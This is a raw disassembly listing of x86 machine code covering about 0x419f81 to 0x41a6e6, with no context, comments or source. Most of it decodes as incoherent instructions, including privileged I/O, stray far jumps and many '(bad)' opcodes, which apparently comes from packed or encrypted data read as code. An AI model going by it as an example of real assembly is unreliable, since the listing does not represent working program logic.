  419f81:	or     BYTE PTR [edi+esi*8],dh
  419f84:	hlt    
  419f85:	inc    esp
  419f86:	jmp    0x778a:0xd9e19a8c
  419f8d:	push   edx
  419f8e:	xor    dh,bl
  419f90:	xchg   esp,eax
  419f91:	sbb    DWORD PTR [edx],edx
  419f93:	mov    ebx,DWORD PTR [bp+di-0x66]
  419f97:	outs   dx,DWORD PTR ds:[esi]
  419f98:	ds test eax,0x555dc691
  419f9e:	dec    ebx
  419f9f:	pop    esi
  419fa0:	inc    ebp
  419fa1:	loop   0x419fc1
  419fa3:	or     al,0x89
  419fa5:	fwait
  419fa6:	mov    ecx,0x5232e18b
  419fab:	jns    0x419f46
  419fad:	(bad)  
  419fae:	aam    0xec
  419fb0:	add    BYTE PTR [eax+0x4021c204],dl
  419fb6:	ror    WORD PTR [esi+ebp*4],0x17
  419fbb:	dec    eax
  419fbc:	scas   eax,DWORD PTR es:[edi]
  419fbd:	mov    dl,0xa5
  419fbf:	cs arpl cx,si
  419fc2:	adc    DWORD PTR [edx],edx
  419fc4:	and    bh,al
  419fc6:	ret    
  419fc7:	popf   
  419fc8:	or     ah,BYTE PTR [ecx-0x28]
  419fcb:	pop    esi
  419fcc:	dec    ebx
  419fcd:	jmp    DWORD PTR [eax+0x57a43101]
  419fd3:	inc    ebx
  419fd4:	ss std 
  419fd6:	and    eax,0xd788a628
  419fdb:	(bad)  
  419fdc:	in     al,0x8b
  419fde:	into   
  419fdf:	test   cl,bh
  419fe1:	data16 in al,0x7c
  419fe4:	in     eax,dx
  419fe5:	and    cl,bl
  419fe7:	ins    BYTE PTR es:[edi],dx
  419fe8:	mov    dh,BYTE PTR [ebx-0x49]
  419feb:	xchg   BYTE PTR [ebp+0x5025be],ch
  419ff1:	in     al,dx
  419ff2:	pop    esp
  419ff3:	outs   dx,BYTE PTR ds:[esi]
  419ff4:	outs   dx,BYTE PTR ds:[esi]
  419ff5:	and    BYTE PTR [edi+0x581dd462],bh
  419ffb:	fisttp QWORD PTR [esi]
  419ffd:	add    dh,BYTE PTR [edx-0x5874a00]
  41a003:	dec    edi
  41a004:	push   eax
  41a005:	push   cs
  41a006:	call   0xa2ca7c1b
  41a00b:	(bad)  
  41a00d:	fcomp  DWORD PTR [ecx+ebx*2]
  41a010:	mov    edx,ecx
  41a012:	mov    al,BYTE PTR [edi+0x6a]
  41a015:	jmp    0xfcebf012
  41a01a:	sub    BYTE PTR [edi],0xf6
  41a01d:	jnp    0x419fc4
  41a01f:	jo     0x419fae
  41a021:	not    BYTE PTR ds:0xce82c965
  41a027:	push   edx
  41a028:	mov    ds:0xcf41af52,eax
  41a02d:	repz fwait
  41a02f:	lea    edx,[eax+0x6a]
  41a032:	jmp    0xfcc5:0x8e401c1
  41a039:	pop    ss
  41a03a:	pushf  
  41a03b:	dec    ebx
  41a03c:	gs push cs
  41a03e:	jg     0x419fca
  41a040:	in     al,dx
  41a041:	scas   eax,DWORD PTR es:[edi]
  41a042:	push   ebp
  41a043:	cwde   
  41a044:	imul   esi,esi,0x356500c7
  41a04a:	cwde   
  41a04b:	repnz inc edi
  41a04d:	inc    ebx
  41a04e:	jge    0x41a04b
  41a050:	adc    bl,BYTE PTR [eax+eax*1-0x3b]
  41a054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a055:	dec    edx
  41a056:	lods   eax,DWORD PTR ds:[esi]
  41a057:	xchg   ebx,eax
  41a058:	pop    esp
  41a059:	daa    
  41a05a:	adc    bl,dh
  41a05c:	inc    edi
  41a05d:	fimul  DWORD PTR [ebp-0x31]
  41a060:	xchg   BYTE PTR [di-0x58],bh
  41a064:	clc    
  41a065:	or     eax,0x8d0e1d42
  41a06a:	xchg   edx,eax
  41a06b:	and    esi,DWORD PTR [esi]
  41a06d:	jns    0x41a010
  41a06f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a070:	or     al,0x18
  41a072:	stc    
  41a073:	aas    
  41a074:	jmp    0x3239b1e5
  41a079:	add    eax,0xbcd4becb
  41a07e:	in     eax,dx
  41a07f:	pop    ebp
  41a080:	mov    BYTE PTR [ebp+0x3a3815a1],al
  41a086:	jg     0x41a009
  41a088:	mov    eax,0xb4d4fa8d
  41a08d:	cmp    BYTE PTR [ecx-0xb],al
  41a090:	xor    BYTE PTR [esi+ebp*1-0x6e93e7f6],ch
  41a097:	jno    0x41a0b2
  41a099:	inc    edx
  41a09a:	add    ebp,DWORD PTR [ecx+0x68]
  41a09d:	add    DWORD PTR gs:[ecx+eax*2],ebp
  41a0a1:	pop    ecx
  41a0a2:	aad    0x1f
  41a0a4:	int3   
  41a0a5:	rcl    BYTE PTR [ebp+0x760b4cf1],0xf7
  41a0ac:	cwde   
  41a0ad:	jnp    0x41a0fa
  41a0af:	gs xor al,bl
  41a0b2:	jl     0x41a07a
  41a0b4:	mov    bl,0xe4
  41a0b6:	call   0xa1c33ede
  41a0bb:	mov    al,ds:0x6af750c0
  41a0c0:	or     ebx,DWORD PTR [eax]
  41a0c2:	call   0x105bc22
  41a0c7:	inc    ax
  41a0c9:	test   al,0xaf
  41a0cb:	outs   dx,BYTE PTR ds:[esi]
  41a0cc:	sbb    edx,0x8630438c
  41a0d2:	imul   ebp,DWORD PTR [esi],0x37698ab
  41a0d8:	mov    ds:0x14ddbb86,eax
  41a0dd:	hlt    
  41a0de:	test   eax,0xf87e887c
  41a0e3:	jmp    0x41a0ef
  41a0e5:	scas   al,BYTE PTR es:[edi]
  41a0e6:	test   eax,0x6bb4435b
  41a0eb:	mov    dh,0x7e
  41a0ed:	xchg   edi,eax
  41a0ee:	jmp    0x41a158
  41a0f0:	dec    esi
  41a0f1:	int    0xc7
  41a0f3:	inc    ecx
  41a0f4:	jo     0x41a155
  41a0f6:	aas    
  41a0f7:	(bad)  
  41a0f8:	cmp    dl,BYTE PTR [eax+0x58b0b0b3]
  41a0fe:	adc    al,0x9c
  41a100:	mov    BYTE PTR [edx+eiz*4+0x13],cl
  41a104:	leave  
  41a105:	jae    0x41a185
  41a107:	outs   dx,DWORD PTR ds:[esi]
  41a108:	dec    ebp
  41a109:	xor    eax,0x4e038c10
  41a10e:	sbb    al,bh
  41a110:	xor    BYTE PTR [ebp+0x3f],dl
  41a113:	sub    DWORD PTR [edi+0x60],ebx
  41a116:	xor    al,0xe6
  41a118:	mov    ecx,0x806eaccd
  41a11d:	xor    bh,BYTE PTR [edi+ebp*8-0x30f14808]
  41a124:	ror    BYTE PTR [ebp+edi*1+0x75],cl
  41a128:	or     dl,BYTE PTR fs:[edi]
  41a12b:	pop    edi
  41a12c:	xchg   esp,eax
  41a12d:	xor    WORD PTR [esp+edi*8],si
  41a131:	mov    bl,BYTE PTR [ebx]
  41a133:	rol    BYTE PTR [edi],0x54
  41a136:	icebp  
  41a137:	mov    DWORD PTR [edx+eax*4],ecx
  41a13a:	mov    edx,gs
  41a13c:	xchg   edx,eax
  41a13d:	dec    esp
  41a13e:	ds lock std 
  41a141:	jnp    0x41a0dd
  41a143:	mov    ebx,0xcc17c6ed
  41a148:	int    0xc
  41a14a:	in     eax,0x6a
  41a14c:	clc    
  41a14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a14e:	and    BYTE PTR [ecx+0x59],0xa9
  41a152:	or     DWORD PTR [esi+ebx*8+0x4146da62],ecx
  41a159:	or     al,0xf2
  41a15b:	jnp    0x41a143
  41a15d:	xchg   esp,eax
  41a15e:	shl    dl,cl
  41a160:	mov    ds:0x795ab9a8,al
  41a165:	(bad)  
  41a166:	mov    edi,0x5a77f9f6
  41a16b:	test   DWORD PTR [ecx],ebp
  41a16d:	xchg   edi,eax
  41a16e:	in     al,0x1f
  41a170:	inc    ebx
  41a171:	repz shl edi,1
  41a174:	stc    
  41a175:	jae    0x41a0fe
  41a177:	jge    0x41a1a6
  41a179:	sbb    eax,0xa1ab5e27
  41a17e:	aam    0x72
  41a180:	clc    
  41a181:	leave  
  41a182:	add    ah,BYTE PTR [eax+0x2c406ca1]
  41a188:	mov    ecx,0x178fe808
  41a18d:	pop    ds
  41a18e:	add    ecx,DWORD PTR gs:[edx]
  41a191:	xchg   edx,eax
  41a192:	push   ax
  41a194:	test   eax,0x5367c691
  41a199:	call   0x794d:0xc732cbf9
  41a1a0:	xchg   edx,eax
  41a1a1:	imul   ebp,DWORD PTR [ebx],0x550dfff9
  41a1a7:	je     0x41a1da
  41a1a9:	or     ebx,DWORD PTR [eax+0xde3bf9f]
  41a1af:	push   ecx
  41a1b0:	rol    BYTE PTR [edx],cl
  41a1b2:	mov    ebp,0x81ab10b4
  41a1b7:	scas   al,BYTE PTR es:[edi]
  41a1b8:	jp     0x41a190
  41a1ba:	imul   ebx,DWORD PTR ds:[edi],0x53
  41a1be:	outs   dx,DWORD PTR ds:[esi]
  41a1bf:	push   esi
  41a1c0:	pop    ss
  41a1c1:	ja     0x41a143
  41a1c3:	sar    ebp,cl
  41a1c5:	xchg   edx,eax
  41a1c6:	inc    eax
  41a1c7:	call   DWORD PTR [edx]
  41a1c9:	jnp    0x41a225
  41a1cb:	pcmpgtw mm2,QWORD PTR [esi+0x3]
  41a1cf:	sbb    al,0xe6
  41a1d1:	fbstp  TBYTE PTR [ecx-0x6b96f1e1]
  41a1d7:	xchg   ebp,eax
  41a1d8:	outs   dx,BYTE PTR ds:[esi]
  41a1d9:	xchg   DWORD PTR [ebx],edi
  41a1db:	ror    DWORD PTR [ebx+0x4d89f44d],1
  41a1e1:	or     BYTE PTR [ebx-0x7bf0f7b3],cl
  41a1e7:	jb     0x41a255
  41a1e9:	add    BYTE PTR [eax],al
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	sbb    DWORD PTR [edx-0x26],edi
  41a20a:	xor    DWORD PTR [esi+0x1c],ebp
  41a20d:	jge    0x41a289
  41a20f:	or     bl,BYTE PTR [edi+0x7a]
  41a212:	jp     0x41a1be
  41a214:	push   ds
  41a215:	fidiv  DWORD PTR gs:[ecx+edx*4+0x67]
  41a21a:	call   0x1a6f525b
  41a21f:	mov    BYTE PTR [esi+0x3b8ea42e],cl
  41a225:	push   0xd0671679
  41a22a:	call   DWORD PTR [edx+0x2c0be5fd]
  41a230:	outs   dx,BYTE PTR ds:[esi]
  41a231:	out    dx,eax
  41a232:	inc    edi
  41a233:	call   0xa9b988af
  41a238:	and    ebx,ecx
  41a23a:	sub    edx,edi
  41a23c:	xchg   BYTE PTR [ecx+0x1],cl
  41a23f:	hlt    
  41a240:	inc    edi
  41a241:	faddp  st(7),st
  41a243:	shl    DWORD PTR [edx+0x7aa05cf9],cl
  41a249:	xor    eax,0x3182b4d7
  41a24f:	push   0xffffffcd
  41a251:	into   
  41a252:	and    edi,ebx
  41a254:	aaa    
  41a255:	xor    esp,DWORD PTR [eax-0x4c080387]
  41a25b:	sbb    BYTE PTR ds:[edi+0x33eead85],ah
  41a262:	cwde   
  41a263:	mov    ds:0xf8d6ff58,al
  41a268:	call   0x10ba4063
  41a26d:	and    BYTE PTR [ecx+edi*4-0xc4b042e],cl
  41a274:	gs jne 0x41a2b7
  41a277:	mov    bh,0xb3
  41a279:	ja     0x41a29c
  41a27b:	dec    ebp
  41a27c:	das    
  41a27d:	lods   al,BYTE PTR ds:[esi]
  41a27e:	in     eax,dx
  41a27f:	dec    ecx
  41a280:	jno    0x41a209
  41a282:	push   ecx
  41a283:	pop    ebp
  41a284:	push   0xffffff98
  41a286:	push   edx
  41a287:	leave  
  41a288:	sbb    DWORD PTR [ebp+eax*1+0x20],ebp
  41a28c:	mov    ch,0xcf
  41a28e:	test   eax,0xec56670b
  41a293:	in     eax,0xb3
  41a295:	retf   
  41a296:	inc    ecx
  41a297:	xchg   edx,eax
  41a298:	popa   
  41a299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a29a:	test   BYTE PTR [ebx+0x3a3ba0af],ah
  41a2a0:	xchg   DWORD PTR [edi-0x4e],esi
  41a2a3:	jne    0x41a241
  41a2a5:	test   al,0x7d
  41a2a7:	int    0x20
  41a2a9:	sahf   
  41a2aa:	or     eax,DWORD PTR [esi]
  41a2ac:	clc    
  41a2ad:	(bad)
  41a2b1:	pavgw  mm7,mm2
  41a2b4:	push   0x6dd402bd
  41a2b9:	mov    cl,0x5f
  41a2bb:	cmp    BYTE PTR [ebx],dl
  41a2bd:	xor    eax,ebp
  41a2bf:	xchg   edx,eax
  41a2c0:	inc    edi
  41a2c1:	sti    
  41a2c2:	xchg   DWORD PTR [esi],ebp
  41a2c4:	jnp    0x41a2a6
  41a2c6:	inc    esp
  41a2c7:	mov    eax,0x7da024fd
  41a2cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2cd:	xchg   edx,eax
  41a2ce:	into   
  41a2cf:	or     BYTE PTR [edi],0x18
  41a2d2:	je     0x41a2ec
  41a2d4:	add    ch,BYTE PTR [edx+0x516e43e9]
  41a2da:	push   0x8765d020
  41a2df:	push   ds
  41a2e0:	in     al,dx
  41a2e1:	neg    bh
  41a2e3:	ret    0x5ec3
  41a2e6:	lea    esp,[edx-0x53fbd075]
  41a2ec:	daa    
  41a2ed:	sahf   
  41a2ee:	xchg   ebp,eax
  41a2ef:	inc    ebp
  41a2f0:	(bad)  
  41a2f2:	push   eax
  41a2f3:	in     al,0x7
  41a2f5:	fcomp  DWORD PTR [edi]
  41a2f7:	dec    ecx
  41a2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2f9:	pop    edi
  41a2fa:	dec    ebp
  41a2fb:	das    
  41a2fc:	(bad)  
  41a2fd:	mov    edx,0x12fdf8c
  41a302:	mov    al,0x92
  41a304:	xor    eax,0xb2de4874
  41a309:	push   eax
  41a30a:	mov    al,0x7b
  41a30c:	mov    dh,0xfb
  41a30e:	jmp    0x41a2db
  41a310:	pop    es
  41a311:	fdiv   DWORD PTR [ebp+0x495535b7]
  41a317:	xlat   BYTE PTR ds:[ebx]
  41a318:	cs jp  0x41a2aa
  41a31b:	sbb    BYTE PTR [ebx],ah
  41a31d:	or     BYTE PTR [edi+0x4],bl
  41a320:	call   0x9c5673cc
  41a325:	(bad)  
  41a326:	int    0x42
  41a328:	jne    0x41a33f
  41a32a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a32b:	xchg   esi,eax
  41a32c:	inc    ebp
  41a32d:	xlat   BYTE PTR ds:[ebx]
  41a32e:	push   ebp
  41a32f:	call   0x9b62591a
  41a334:	fs push ds
  41a336:	adc    BYTE PTR [ecx-0x6b88f397],dh
  41a33c:	adc    BYTE PTR [edx],0x58
  41a33f:	dec    edi
  41a340:	imul   esi,DWORD PTR [edx+eax*1+0x4c],0x4
  41a345:	or     ah,BYTE PTR [eax+0x5297b89c]
  41a34b:	stc    
  41a34c:	sub    ecx,DWORD PTR [eax-0x75585d82]
  41a352:	lea    ebp,[ebx+ebx*1+0x20]
  41a356:	push   ds
  41a357:	(bad)  
  41a358:	cmp    ebp,DWORD PTR [edi+0x24]
  41a35b:	pop    ebp
  41a35c:	ins    DWORD PTR es:[edi],dx
  41a35d:	imul   esi,edi,0xffffffb0
  41a360:	sub    esi,edx
  41a362:	cld    
  41a363:	jno    0x41a31f
  41a365:	adc    dh,BYTE PTR [ebx-0x58c3c308]
  41a36b:	xor    al,0x17
  41a36d:	or     DWORD PTR [edx+ebx*1+0x1],ebx
  41a371:	jae    0x41a3ab
  41a373:	enter  0xa053,0xab
  41a377:	push   edi
  41a378:	inc    edx
  41a379:	rol    DWORD PTR [ebx],0x1d
  41a37c:	imul   ebx,DWORD PTR [ebx+0x58],0xffffffe4
  41a380:	jecxz  0x41a33b
  41a382:	or     bh,BYTE PTR [ebx+0x136f0adf]
  41a388:	imul   esp,edx,0x52
  41a38b:	fcom   DWORD PTR [edi-0x127fa0db]
  41a391:	and    BYTE PTR ds:0xdd1c7ab0,bh
  41a397:	sub    DWORD PTR [ebp-0x4ae43bda],0xffffff8f
  41a39e:	cld    
  41a39f:	cmp    ah,BYTE PTR [edx-0x7ad68684]
  41a3a5:	mov    eax,ds:0x9e3dcb3
  41a3aa:	inc    ebp
  41a3ab:	xchg   al,dh
  41a3ad:	pop    ebx
  41a3ae:	adc    BYTE PTR [esp+ebp*1+0x35],dl
  41a3b2:	xchg   edx,eax
  41a3b3:	rcl    esp,cl
  41a3b5:	repnz inc esi
  41a3b7:	dec    eax
  41a3b8:	(bad)  
  41a3b9:	cmp    al,0xdb
  41a3bb:	cmp    eax,0x2fb53ff
  41a3c0:	fwait
  41a3c1:	call   0x7d079ef7
  41a3c6:	mov    ecx,esp
  41a3c8:	inc    ebp
  41a3c9:	ds nop
  41a3cb:	leave  
  41a3cc:	dec    DWORD PTR ds:0x744fc1e0
  41a3d2:	dec    esp
  41a3d3:	scas   al,BYTE PTR es:[edi]
  41a3d4:	sbb    BYTE PTR [esi-0x7ec2a642],cl
  41a3da:	mov    esi,0x10d7ea87
  41a3df:	ins    BYTE PTR es:[edi],dx
  41a3e0:	stos   DWORD PTR es:[edi],eax
  41a3e1:	inc    edi
  41a3e2:	bound  ebp,QWORD PTR [edi]
  41a3e4:	aaa    
  41a3e5:	jmp    0xb43475de
  41a3ea:	inc    ebx
  41a3eb:	cmc    
  41a3ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ed:	xchg   esi,eax
  41a3ee:	popf   
  41a3ef:	pushf  
  41a3f0:	sar    BYTE PTR [edi],cl
  41a3f2:	adc    eax,0x85ac7acf
  41a3f7:	dec    eax
  41a3f8:	dec    esp
  41a3f9:	les    ecx,FWORD PTR [ecx+0x4c]
  41a3fc:	aam    0x50
  41a3fe:	lock pop eax
  41a400:	dec    ebx
  41a401:	(bad)  
  41a402:	ficomp WORD PTR [ebx+0x6635cb59]
  41a408:	scas   al,BYTE PTR es:[edi]
  41a409:	aad    0xbe
  41a40b:	scas   eax,DWORD PTR es:[edi]
  41a40c:	xor    al,0xbc
  41a40e:	arpl   WORD PTR [ecx-0x74],sp
  41a411:	sbb    BYTE PTR [eax*2-0x442164e4],dl
  41a418:	inc    ecx
  41a419:	cmc    
  41a41a:	outs   dx,BYTE PTR ds:[esi]
  41a41b:	or     al,0x1a
  41a41d:	jb     0x41a471
  41a41f:	pop    ebx
  41a420:	inc    esi
  41a421:	xor    dh,BYTE PTR [edi+esi*2]
  41a424:	dec    edi
  41a425:	in     eax,dx
  41a426:	and    eax,0x319fb748
  41a42b:	jno    0x41a407
  41a42d:	int    0x8d
  41a42f:	sbb    al,0x5e
  41a431:	das    
  41a432:	dec    ebp
  41a433:	das    
  41a434:	inc    eax
  41a435:	xor    al,0xdf
  41a437:	neg    esi
  41a439:	inc    edi
  41a43a:	imul   esp,DWORD PTR [eax+0x7f],0x75
  41a43e:	in     eax,dx
  41a43f:	jne    0x41a4b6
  41a441:	inc    esp
  41a442:	outs   dx,BYTE PTR ds:[esi]
  41a443:	mov    dh,0x57
  41a445:	hlt    
  41a446:	ficomp DWORD PTR [ebp+0x58993e7a]
  41a44c:	push   ds
  41a44d:	pop    ds
  41a44e:	lea    eax,es:[edx+0x58216271]
  41a455:	ret    
  41a456:	pop    ebx
  41a457:	sub    DWORD PTR [edi-0x606ef737],edi
  41a45d:	adc    eax,esp
  41a45f:	sbb    eax,0xa9d16735
  41a464:	lahf   
  41a465:	imul   ebp,DWORD PTR ds:0x62274cc8,0xffffffa5
  41a46c:	cmp    eax,0x11da8b54
  41a471:	add    BYTE PTR [esi+eiz*1+0x49],ah
  41a475:	sub    DWORD PTR [edi+0x63],0xffffffdd
  41a479:	sub    al,0xb
  41a47b:	or     bh,BYTE PTR [ebx-0x6e670516]
  41a481:	add    al,cl
  41a483:	popa   
  41a484:	sti    
  41a485:	push   0xffffffcd
  41a487:	pop    es
  41a488:	jge    0x41a4f8
  41a48a:	loopne 0x41a415
  41a48c:	stc    
  41a48d:	xor    al,0x2a
  41a48f:	sub    esp,DWORD PTR [esi+0x10583fbf]
  41a495:	push   ecx
  41a496:	jge    0x41a4e1
  41a498:	retf   
  41a499:	and    eax,0xc535e8eb
  41a49e:	pop    ss
  41a49f:	pop    eax
  41a4a0:	cmp    eax,DWORD PTR [esi+0x6a]
  41a4a3:	popf   
  41a4a4:	push   edi
  41a4a5:	and    eax,0xc558f455
  41a4aa:	pop    edx
  41a4ab:	jae    0x41a458
  41a4ad:	push   cs
  41a4ae:	xor    al,0x63
  41a4b0:	mov    eax,0x913a649c
  41a4b5:	xor    eax,0x76b64f65
  41a4ba:	test   DWORD PTR [edx+0x3ed34207],ebx
  41a4c0:	add    edi,ebp
  41a4c2:	ins    DWORD PTR es:[edi],dx
  41a4c3:	mov    bl,0xf9
  41a4c5:	sbb    BYTE PTR [eax+0x1d],ah
  41a4c8:	mov    DWORD PTR [edi],esp
  41a4ca:	cs push ebp
  41a4cc:	(bad)  
  41a4cd:	bound  ebp,QWORD PTR [esi+0x3f]
  41a4d0:	loopne 0x41a531
  41a4d2:	arpl   WORD PTR [eax+0x35],si
  41a4d5:	ins    DWORD PTR es:[edi],dx
  41a4d6:	dec    edi
  41a4d7:	rol    BYTE PTR [edx+eiz*4],1
  41a4da:	or     eax,0xb14ee3b8
  41a4df:	test   BYTE PTR ds:0x656c7bef,bl
  41a4e5:	xchg   ecx,eax
  41a4e6:	in     al,0xf9
  41a4e8:	repz add al,0x21
  41a4eb:	mov    fs,WORD PTR [ecx]
  41a4ed:	lea    ecx,[esi+0x23]
  41a4f0:	shl    esp,0xf7
  41a4f3:	dec    ebp
  41a4f4:	in     al,dx
  41a4f5:	push   ebx
  41a4f6:	xchg   esp,eax
  41a4f7:	jmp    0x625f:0xa621835b
  41a4fe:	sub    esp,DWORD PTR [edi+0x4a]
  41a501:	adc    al,0x15
  41a503:	and    DWORD PTR [ebx+0x32],eax
  41a506:	rcr    DWORD PTR [ecx],0xab
  41a509:	push   esp
  41a50a:	push   es
  41a50b:	jns    0x41a4eb
  41a50d:	add    esp,ebx
  41a50f:	xchg   BYTE PTR [eax+0x7ab1865],al
  41a515:	jne    0x41a539
  41a517:	and    ebx,DWORD PTR [ebx]
  41a519:	pop    ebx
  41a51a:	push   ss
  41a51b:	xor    BYTE PTR [bp+si+0x57],dl
  41a51f:	jo     0x41a4ee
  41a521:	add    DWORD PTR [eax+0x6dd0e473],esp
  41a527:	mov    edx,0x3f5306d7
  41a52c:	leave  
  41a52d:	jecxz  0x41a4ce
  41a52f:	icebp  
  41a530:	jne    0x41a50d
  41a532:	and    al,0xdb
  41a534:	or     bh,cl
  41a536:	les    ebx,FWORD PTR [ebx-0x65]
  41a539:	fcomp  DWORD PTR [eax]
  41a53b:	lahf   
  41a53c:	push   esp
  41a53d:	lds    ebp,FWORD PTR [edx+0x70]
  41a540:	or     ecx,DWORD PTR [esi+0x50188fc9]
  41a546:	push   esi
  41a547:	jmp    0x41a5b0
  41a549:	bound  esi,QWORD PTR [edi+0x78]
  41a54c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a54d:	push   ebx
  41a54e:	push   es
  41a54f:	cmc    
  41a550:	mov    bh,0xf7
  41a552:	inc    edi
  41a553:	stos   BYTE PTR es:[edi],al
  41a554:	jbe    0x41a52e
  41a556:	and    BYTE PTR [ebp+eax*1+0x4c],ch
  41a55a:	push   eax
  41a55b:	hlt    
  41a55c:	rcl    DWORD PTR [edi+eiz*4],1
  41a55f:	repnz stos BYTE PTR es:[edi],al
  41a561:	push   esp
  41a562:	mov    esi,0x29b59b88
  41a567:	in     eax,0x4e
  41a569:	sub    BYTE PTR [esi+0x4d],dh
  41a56c:	loop   0x41a53c
  41a56e:	(bad)  
  41a56f:	cmp    ah,ah
  41a571:	loope  0x41a583
  41a573:	out    0x15,eax
  41a575:	cdq    
  41a576:	hlt    
  41a577:	adc    al,0x9e
  41a579:	(bad)  
  41a57a:	sbb    DWORD PTR [edx-0x62df7c9a],ecx
  41a580:	inc    esp
  41a581:	or     bh,BYTE PTR cs:[ebx+0x21]
  41a585:	mov    edi,es
  41a587:	mov    ecx,0xb5e094a4
  41a58c:	sbb    DWORD PTR ds:0x5d0cc8fe,ecx
  41a592:	rcl    DWORD PTR [esi+0x76],1
  41a595:	call   0xe28923d3
  41a59a:	out    dx,eax
  41a59b:	in     al,dx
  41a59c:	mov    esp,0x18a69c0c
  41a5a1:	pop    ds
  41a5a2:	sahf   
  41a5a3:	mov    ecx,0x5ca0e76a
  41a5a8:	add    edi,DWORD PTR [esi+0x4dfd4b06]
  41a5ae:	loopne 0x41a55c
  41a5b0:	lods   al,BYTE PTR ds:[esi]
  41a5b1:	dec    ebp
  41a5b2:	add    bh,ch
  41a5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5b5:	push   ebx
  41a5b6:	int    0x12
  41a5b8:	add    BYTE PTR [edx-0x633b798a],0x7f
  41a5bf:	dec    ecx
  41a5c0:	or     DWORD PTR [ebx+0x70],eax
  41a5c3:	pop    ebp
  41a5c4:	or     ah,BYTE PTR [esi+0x3c2a3fcc]
  41a5ca:	bound  eax,QWORD PTR [ecx+0x78fc808d]
  41a5d0:	sti    
  41a5d1:	ret    0xc3b5
  41a5d4:	nop
  41a5d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5d6:	sub    al,0x49
  41a5d8:	loopne 0x41a574
  41a5da:	out    0xdc,eax
  41a5dc:	nop
  41a5dd:	add    al,0xb2
  41a5df:	pop    ds
  41a5e0:	and    BYTE PTR [eiz*4+0x13f86d8b],bl
  41a5e7:	cli    
  41a5e8:	test   BYTE PTR gs:[esi+esi*8+0x62a85860],ah
  41a5f0:	mov    ecx,?
  41a5f2:	in     al,0x84
  41a5f4:	jb     0x41a5e0
  41a5f6:	scas   eax,DWORD PTR es:[edi]
  41a5f7:	scas   al,BYTE PTR es:[edi]
  41a5f8:	mov    al,ds:0x292a55d7
  41a5fd:	packsswb mm1,QWORD PTR [eax+ebx*2+0x41]
  41a602:	mov    ecx,0x5e87843d
  41a607:	(bad)  
  41a609:	mov    eax,ds:0x4aaa7b2a
  41a60e:	inc    ecx
  41a60f:	inc    ebp
  41a610:	mov    dl,BYTE PTR [ecx+0x5da052c5]
  41a616:	jg     0x41a656
  41a618:	sti    
  41a619:	push   es
  41a61a:	jp     0x41a60b
  41a61c:	xchg   edx,eax
  41a61d:	xchg   ebp,eax
  41a61e:	adc    bl,BYTE PTR ds:0x44c0a937
  41a624:	mov    edi,0x3ab09bc7
  41a629:	cli    
  41a62a:	push   ss
  41a62b:	mov    ds:0xbf135d29,al
  41a630:	ret    
  41a631:	pop    ss
  41a632:	cmp    eax,0x25fcacf9
  41a637:	adc    BYTE PTR [eax-0x3],0x5a
  41a63b:	cld    
  41a63c:	pop    edi
  41a63d:	dec    esp
  41a63e:	lds    ebx,FWORD PTR [edi+0x66]
  41a641:	sub    ebx,DWORD PTR [edi-0x33]
  41a644:	test   BYTE PTR [ecx],ch
  41a646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a647:	or     ah,BYTE PTR [edi+eiz*8-0x5ec7bae8]
  41a64e:	cmp    BYTE PTR [ebx-0x51a4cb7d],bh
  41a654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a655:	je     0x41a5e8
  41a657:	push   0xb22cd443
  41a65c:	imul   edi,ebp,0xffffffe5
  41a65f:	dec    edx
  41a660:	push   ecx
  41a661:	cmp    eax,0x4f4d2bb8
  41a666:	cmp    ebx,DWORD PTR ds:0x9477a386
  41a66c:	int    0xda
  41a66e:	adc    DWORD PTR [eax-0x33],ecx
  41a671:	cmc    
  41a672:	sub    BYTE PTR [ebp+0x2e79a81a],0x46
  41a679:	cmp    cl,BYTE PTR [ecx]
  41a67b:	add    ecx,ebx
  41a67d:	lahf   
  41a67e:	popf   
  41a67f:	ror    DWORD PTR [esi+0x1c],0x2a
  41a683:	jg     0x41a64d
  41a685:	jne    0x41a608
  41a687:	sub    DWORD PTR ds:0x35426d88,esp
  41a68d:	sub    al,BYTE PTR [ebp-0x5017d199]
  41a693:	cmp    al,0xd5
  41a695:	imul   ecx,DWORD PTR [edx+edi*1],0xffffffaa
  41a699:	outs   dx,DWORD PTR ds:[esi]
  41a69a:	inc    edx
  41a69b:	pop    ss
  41a69c:	arpl   WORD PTR [esi+0x73],di
  41a69f:	retf   0xe649
  41a6a2:	stc    
  41a6a3:	mov    al,ds:0x814d7903
  41a6a8:	cwde   
  41a6a9:	enter  0xba43,0xae
  41a6ad:	mov    ds:0x6a46c4d3,eax
  41a6b2:	push   0x3c841f30
  41a6b7:	retf   
  41a6b8:	or     DWORD PTR [edx-0x15],edi
  41a6bb:	sbb    DWORD PTR [ebp+0x166cb413],0xa37113f6
  41a6c5:	mov    ch,0xf4
  41a6c7:	loope  0x41a67d
  41a6c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6ca:	mov    esp,0x26a04e4d
  41a6cf:	fcomp  DWORD PTR [ecx-0x35179185]
  41a6d5:	(bad)  
  41a6d6:	sbb    eax,0xb12d689a
  41a6db:	jns    0x41a6da
  41a6dd:	js     0x41a68b
  41a6df:	cdq    
  41a6e0:	cmc    
  41a6e1:	xchg   esp,ebp
  41a6e3:	fld    QWORD PTR [ecx-0x7c]
  41a6e6:	cmp    BYTE PTR [ebx+0x75],0x6d
